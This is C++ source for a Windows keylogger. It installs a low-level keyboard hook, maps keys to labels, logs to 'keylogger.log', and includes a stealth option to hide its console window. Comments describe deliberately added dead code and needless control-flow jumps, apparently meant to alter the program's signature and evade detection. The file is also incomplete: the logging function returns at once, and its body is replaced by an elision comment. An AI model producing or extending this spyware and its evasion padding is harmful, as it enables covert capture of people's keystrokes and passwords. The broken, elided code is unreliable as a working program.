#define UNICODE
#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>

#define visible // (visible / invisible)
#define FORMAT 0
#define mouseignore

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]" },
    {VK_RETURN, "\n" },
    {VK_SPACE, "_" },
    {VK_TAB, "[TAB]" },
    {VK_SHIFT, "[SHIFT]" },
    {VK_LSHIFT, "[LSHIFT]" },
    {VK_RSHIFT, "[RSHIFT]" },
    {VK_CONTROL, "[CONTROL]" },
    {VK_LCONTROL, "[LCONTROL]" },
    {VK_RCONTROL, "[RCONTROL]" },
    {VK_MENU, "[ALT]" },
    {VK_LWIN, "[LWIN]" },
    {VK_RWIN, "[RWIN]" },
    {VK_ESCAPE, "[ESCAPE]" },
    {VK_END, "[END]" },
    {VK_HOME, "[HOME]" },
    {VK_LEFT, "[LEFT]" },
    {VK_RIGHT, "[RIGHT]" },
    {VK_UP, "[UP]" },
    {VK_DOWN, "[DOWN]" },
    {VK_PRIOR, "[PG_UP]" },
    {VK_NEXT, "[PG_DOWN]" },
    {VK_OEM_PERIOD, "." },
    {VK_DECIMAL, "." },
    {VK_OEM_PLUS, "+" },
    {VK_OEM_MINUS, "-" },
    {VK_ADD, "+" },
    {VK_SUBTRACT, "-" },
    {VK_CAPITAL, "[CAPSLOCK]" },
};
#endif
HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            Save(kbdStruct.vkCode);
        }
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        // Adding unnecessary code jumps and dead code
        if (GetAsyncKeyState(VK_SPACE) & 0x8000)
        {
            int x = 5;
            if (x == 5)
            {
                LPCWSTR a = L"Failed to install hook!";
                LPCWSTR b = L"Error";
                MessageBox(NULL, a, b, MB_ICONERROR);
                return;
            }
        }
    }
    else
    {
        // Adding unnecessary code jumps
        if (GetAsyncKeyState(VK_RETURN) & 0x8000)
        {
            int y = 10;
            if (y != 5)
            {
                return;
            }
        }
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";
    // Adding dead code
    int z = 42;
    if (z == 42)
    {
        return 0;
    }

    // ... Rest of the code remains unchanged ...

    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}

int main()
{
    const char* output_filename = "keylogger.log";
    std::cout << "Logging output to " << output_filename << std::endl;
    output_file.open(output_filename, std::ios_base::app);

    // Changing the control flow by adding an unnecessary loop
    for (int i = 0; i < 1; ++i)
    {
        // Adding dead code
        if (i == 1)
        {
            continue;
        }

        SetHook();

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            // Adding unnecessary code jumps
            if (msg.message == WM_QUIT)
            {
                int a = 5;
                if (a == 5)
                {
                    break;
                }
            }
        }
    }
}
